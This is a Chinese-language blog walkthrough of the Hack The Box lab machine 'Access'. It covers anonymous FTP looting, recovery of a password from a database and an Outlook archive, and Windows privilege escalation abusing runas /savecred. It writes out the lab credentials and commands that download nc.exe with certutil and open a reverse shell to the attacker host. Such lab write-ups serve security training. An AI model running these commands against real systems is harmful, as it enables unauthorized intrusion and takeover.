> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tvGTafFN6Fyiw5FFlgmJmw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **79** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_gif/44UT6cJicBVUGUwbPDzvHtk8BGscpG3ucFWttjjHAn9nKuuIgYFBUTnnQHd6rCFEtTN7YAhIZoEGwSdKaSLqNlA/640?wx_fmt=gif)

靶机地址：https://www.hackthebox.eu/home/machines/profile/156

靶机难度：初级（4.0/10）

靶机发布日期：2019 年 2 月 25 日

靶机描述：

Access is an "easy" difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/8NicMvXribe7uMvSuOzNiaduO31HtjchjrUcB2HicpDUBet2J3rTz8EjbKaRq2f8zEGWnV8x1UoNQBf8WLXZISpNIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XxrR38Omj5OU35wZiblPezbUu0aFe8g7adFDiar2por60icw9uh1XSFlykibc3jzCByDbG1hhhxNEk13P15Ofiam6Mg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_gif/z0LeJkZyUa7niaILpQLyj2SXVMFWPGRlKJVgNJ6OUubgicSlhy5yoOrKmqJ2dcAicOTFYG7FUAxFCCbYwz70WcaoQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQwKiaEVOibqYUiae8wGiaYdibMNrhQMOkJ5Tq92RhotcVSt3UtztSAZuFN0Q/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.98....

Nmap 发现可以匿名登录 FTP，Telnet 和运行 IIS 7.5 的 Web 服务器运行着，IIS 7.5 知道是 Windows Server 2008 R2 版本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQd5tpyY9tqdcxrealuwcEjjaTcV5E9vUtURib72RibVtIA2mx7V2k1vFA/640?wx_fmt=png)

80 页面可以看到视频监控的图片... 没获得什么信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQ8FOdHicmZZ8GLibUEhQicGO7hpEsXNpvw8IffqlKLGEKGGqXicJRwicxXNA/640?wx_fmt=png)

直接来到 FTP 匿名登录了.. 发现两个文件，下载分析...

backup.mdb 是数据库文件... 找下底层有没有账号密码...

apt-get install mdbtools 这里需要下载 mdb 工具对数据库进行查看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQDnroy8Df9aKPpzgLAickich3yIYstic7mOibibbJdyP9RiavMrj0pSy2wqHQ/640?wx_fmt=png)

由于最近 HTB 老是出问题，我这里就最简洁的方式查看到了密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQgWJicWzibGjTfMyJbohHguBXUYwic1aYHop3LnZGs5iclkdlIA9Lp3h99A/640?wx_fmt=png)

输入密码即可...

```
7z e Access\ Control.zip -paccess4u@security
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQxzfQUw7ruzLQwy1eEzibDr869tjY5ickCgn5mhicFtAcdpmx0T9uzeRqw/640?wx_fmt=png)

这是 Microsoft Outlook 电子邮件文件夹...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQO6QcA5Mib4t1geicacDRVCB5Zp5o8ynmecJiaVoPvWd5Bf6FtzPMSHwuA/640?wx_fmt=png)

```
apt-get install pst-utils
readpst 'Access Control.pst'
```

意思是创建了 Access Control.mbox 文件来读取内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQpaN5cpfeqrD8eeJSHOib1ia8g9ULE6cOFvibDRz98rWabpfwbBv5QwkCw/640?wx_fmt=png)

首先看到的是这封电子邮件，其中包含名为的帐户的凭据 security，密码：

```
4CcessC0ntr0ller...
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQOLdy8bvjmmeB1jElPUkxg63bEtuh3g8uaibIicxiaaFOqZ2x3IPOyk0XQ/640?wx_fmt=png)

登陆 23 端口... 成功获得了 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQT8rK4WoGD2lGqnk0V7ouXOtKdjiag60aia7VMoiclQgUeicA0sEPFZmIlg/640?wx_fmt=png)

由于现在处于 security 用户下，无法进入管理员权限.. 在用户界面还存在 Public 用户，进去在桌面发现了 lnk 文件...

读取发现 Windows\System32\runas.exe 以管理员身份运行着...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQ0ibMZD1GeDfXnUtpaqLZibOTdx3X4LYqqOAUicbRE1EOgUiaTFzU0VxBVg/640?wx_fmt=png)

Password required 设置为 No，如果设置为 Yes，将无法在 runas 不知道密码的情况下作为管理员进行使用...

这里的 runas 是允许我们以其他用户身份运行命令，并且该选项 / savecred 允许我们使用该命令无需输入密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQKWOYkhicKmUnZlVLElx8VVKt07QHNZLgDFxethawYTbicnzCXh7Voicsg/640?wx_fmt=png)

这里直接上传 nc.exe，利用 runas /user:Administrator /savecred 无密码登陆模式执行反向 shell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQvpg14VqichhgkOY1FFibK5tibbU2AW70Y3JGibGvbPeXBvzYsPIL1icsicSA/640?wx_fmt=png)

```
certutil -urlcache -split -f http://10.10.14.11/nc.exe nc.exe
echo c:\users\security\nc.exe -e cmd.exe 10.10.14.11 6666 > shell.bat
runas /user:administrator /savecred c:\users\security\shell.bat
```

成功提权... 获得了 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

方法 2：

  

查看：

```
[Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
```

文章可以进行 windows 的命令查询..  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQVT81v0WOFmAKAy9bShjI12J4YEicbgy0JU9EwLVbZA9DAicGAypNpKsA/640?wx_fmt=png)

可以看到 windows 方式提权很多，前辈已经介绍了这类的方法... 开始把

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQVnTkytJ4odWpA9eGQ8IAaFVuWIQLcH1TbYrMbmmz7oYTHJXlTYFDuA/640?wx_fmt=png)

使用 cmdkey 列出机器上存储的凭证... 并且存在一个凭证...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMXOgkJlG058tGc4dFwS5hQibecnWniamNgxC2Ee3KCw9VxBsssWyjh79OMUaice8NVStzTnEEOBEm4g/640?wx_fmt=png)

```
runas /user:Access\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\dayu.txt"
```

可以看到成功获得 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_gif/44UT6cJicBVUGUwbPDzvHtk8BGscpG3ucFWttjjHAn9nKuuIgYFBUTnnQHd6rCFEtTN7YAhIZoEGwSdKaSLqNlA/640?wx_fmt=gif)

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/8NicMvXribe7uMvSuOzNiaduO31HtjchjrUcB2HicpDUBet2J3rTz8EjbKaRq2f8zEGWnV8x1UoNQBf8WLXZISpNIQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)